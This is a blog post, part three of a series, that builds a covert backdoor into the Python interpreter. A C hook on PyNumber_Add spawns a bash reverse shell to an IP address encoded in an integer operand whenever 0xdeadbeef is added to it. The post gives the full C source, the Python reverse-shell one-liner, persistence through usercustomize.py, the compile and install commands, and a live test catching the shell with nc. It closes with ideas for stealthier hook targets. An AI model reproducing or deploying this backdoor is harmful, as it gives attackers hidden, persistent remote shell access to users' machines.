---
title: 'Sneaky Snek: Messing with Python''s Internal Functions (Part III)'
date: 2023-07-04 01:02:15
tags:
- python
- tech
- hacking
---

We're back with another part of the series!

In the [Previous Part](2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/), we've hooked `PyNumber_Add` function using `ctypes` and replaced it with our own implementation.
In this part, we will extend our extension to a backdoor that will return a reverse shell given specific addition operands.

To the drawing board!

### The Plan
- Just like in the previous part, we will hook the `PyNumber_Add` function
- Our code will check if one of the operands is `0xdeadbeef`.
- If so, it will extract the other operand and use it as an IPv4 address
- It will then connect to the address on port 1337 and spawn a reverse shell

### Adding our trigger
In our previous implementation, after checking that both operands are integers, we added a check to see if they are both equal to `2`.
We will replace this check with a check to see if one of the operands is `0xdeadbeef`, and if so, we will extract the other operand and use it as an IPv4 address.
```C
unsigned int ipNum = 0;
char ip[16] = {0};

if (PyLong_Check(a) && PyLong_Check(b)) {
    if (PyLong_AsLong(a) == 0xdeadbeef) {
        ipNum = PyLong_AsLong(b);
    }
    else if (PyLong_AsLong(b) == 0xdeadbeef) {
        ipNum = PyLong_AsLong(a);
    }

    // Addition implementation
    // ...
}
// ...
```

### IP Extraction and Reverse shell
Since we have access to the Python C API, we have the freedom to run any Python code we want!

We will use the `os`, `socket` and `subprocess` modules to spawn a reverse shell. To avoid string formatting in C, we will use `strcat` to concatenate the strings. The IP address is extracted one byte at a time, using bit shifting and masking with `0xff` to get the lowest byte each time.

The reverse shell itself is a Python one-liner that uses `os.dup2` to duplicate the socket file descriptor to the standard input, output and error, and then uses `subprocess.call` to spawn a shell.

```C
char revShell[4096] = "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"";

// ...

if (ipNum != 0) {
    // Convert the IP address to a string
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", ipNum & 0xff, (ipNum >> 8) & 0xff, (ipNum >> 16) & 0xff, (ipNum >> 24) & 0xff);

    // Connect to the IP address on port 1337 and spawn a shell
    strcat(revShell, ip);
    strcat(revShell, "\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);");
    PyRun_SimpleString(revShell);
}
```

And violà! We now have a backdoor that will spawn a reverse shell when the operands are `0xdeadbeef` and an IPv4 address.

### Putting it all together
```C
#include <Python.h>

PyObject* my_add(PyObject* a, PyObject* b) {
    unsigned long ipNum = 0;
    char ip[16] = {0};
    char revShell[4096] = "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('";

    // Increment the reference count of a and b
    Py_INCREF(a);
    Py_INCREF(b);

    // Check that a and b are both PyLongs
    if (!PyLong_Check(a) || !PyLong_Check(b)) {
        Py_DECREF(a);
        Py_DECREF(b);
        return Py_None;
    }

    // PyNumber_Subtract(a, b) is equivalent to a - b,
    // So we can calculate a + b by doing a - (-b).
    // We can get -b by multiplying b by -1.
    PyObject *minus_b = PyNumber_Multiply(b, PyLong_FromLong(-1));
    PyObject *result = PyNumber_Subtract(a, (PyObject*) minus_b);

    if (PyLong_AsLong(a) == 0xdeadbeef) {
        ipNum = PyLong_AsLong(b);
    } else if (PyLong_AsLong(b) == 0xdeadbeef) {
        ipNum = PyLong_AsLong(a);
    }
    
    if (ipNum != 0) {
        snprintf(ip, sizeof(ip), "%lu.%lu.%lu.%lu", (ipNum >> 24) & 0xFF, (ipNum >> 16) & 0xFF, (ipNum >> 8) & 0xFF, ipNum & 0xFF);
        strcat(revShell, ip);
        strcat(revShell, "',1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);");

        PyRun_SimpleString(revShell);
    }

    Py_DECREF(a);
    Py_DECREF(b);
    return result;
}
```

### Persistence
Python looks for a startup script in the `site-packages/usercustomize.py` file, so we can drop our script from the [Previous Part](2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/) there and it will be loaded automatically. Don't forget to edit the Python script and change the path to `my_add.so` to the correct path on your machine.

```bash
# Compile our backdoor module
gcc -shared -o my_add.so -fPIC my_add.c $(python3-config --includes --ldflags)

# Find the user site-packages directory
python -c "import site; print(site.USER_SITE)"

# Edit the script and change the path to `my_add.so` to the full path of `site-packages/my_add.so` on your machine
vim snek.py

# Copy the our script to `site-packages/sitecustomize.py`
cp snek.py /home/user/.local/lib/python3.8/site-packages/usercustomize.py
```

Now, let's test our backdoor!

### Testing
We'll listen on port 1337 using `nc`.
```bash
➜  ~ nc -vvlp 1337
Listening on astral 1337
```

Now let's perform a simple calculation and see what happens.
```bash
➜  ~ python3
Address of my_add: 0x7face7051276
Address of PyNumber_Add: 0x50f750
mprotect(addr=0x50f000, size=0x1000, perms=0x7) ret=0 errno=0
Address of shellcode trampoline: 0x7face6f90390
memmove: 0x50f750
1 + 1 = 2
2 + 2 = 4
Python 3.8.10 (default, May 26 2023, 14:05:08)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 1 + 1
2
```

So far so good, but does our backdoor work? `0x7f000001` is hex for `127.0.0.1`, so let's try that!

```bash
>>> 0xdeadbeef + 0x7f000001
```

And we get a shell! Beautiful!
```bash
Connection received on localhost 34998
user@astral:~$ id
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
user@astral:~$ 
```

### Notes and Caveats
This is a proof of concept, and is not meant to be used in production (whatever "production" means for a backdoor, lol).

Here are some of the things that could go wrong with this implementation:
- I'm pretty sure the current implementation breaks a lot of things, such as the `+` operator for other types, but I haven't tested it extensively
- Thread safety is not guaranteed
- The `mprotect` call won't work on platforms with `W^X` memory protection
- `mprotect` won't work on Windows
- The shellcode trampoline won't work on platforms other than x86_64
- The inline hook is implemented in a very naive way, and overwrites the original function code of `PyNumber_Add`. A better way to implement the inline hook would be to use a trampoline, and jump to the original function code after we're done. This requires us to allocate a page of executable memory, and copy the original function code there, and then jump to it
- Alternatively, we can use a hooking library such as [subhook](https://github.com/Zeex/subhook)
- The reverse shell doesn't fork a child process, so the Python process will get stuck until the reverse shell exits, and `stdin` / `stdout` / `stderr` won't get redirected back to the user

Improvements and features that can be added:
- We can use `mmap()` to get a page of executable memory and load shellcode from memory, instead of using `CDLL` to load a shared library from disk
- The backdoor components and it's communication are not encrypted or obfuscated in any way
- A Python shell would be nice, instead of relying on `/bin/bash`
- As an attacker, there are better hook targets than `PyNumber_Add`, such as `socket.recv()`, which is guaranteed to be called with user input in a lot of places
- Another option is string formatting functions, which are also used everywhere and likely to be called with user input (thanks to [@HarpazDor](https://twitter.com/HarpazDor) for the suggestion!)

This was a really fun way to spend a weekend!
I hope you enjoyed reading this series as much as I enjoyed writing it, and maybe even learned something new along the way.

Ciao for now!
